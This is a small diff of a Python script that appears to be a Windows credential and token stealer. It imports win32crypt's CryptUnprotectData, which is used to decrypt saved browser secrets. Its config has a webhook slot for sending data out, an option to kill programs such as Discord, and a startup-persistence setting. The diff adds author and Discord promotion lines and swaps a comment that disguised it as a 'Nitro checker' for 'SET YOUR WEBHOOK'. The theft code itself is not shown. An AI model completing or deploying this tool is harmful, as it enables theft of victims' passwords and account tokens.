@@ -1,3 +1,6 @@
+## Coded By JavorR#8365
+## Discord : https://discord.gg/bReDqyZfhM
+## Join To Discord Server
 import os
 import json
 import httpx
@@ -25,8 +28,8 @@ from win32crypt import CryptUnprotectData
 
 
 config = {
-    # DO NOT TOUCH THE DISCORD NITRO CHECKER CODE. 
-    'webhook': "",
+    # SET YOUR WEBHOOK. 
+    'webhook': "PUT YOUR WEBHOOK",
     # Set to False if you don't want it to kill programs such as discord upon running the exe.
     'kill_processes': False,
     # This makes the program run the file after every startup.
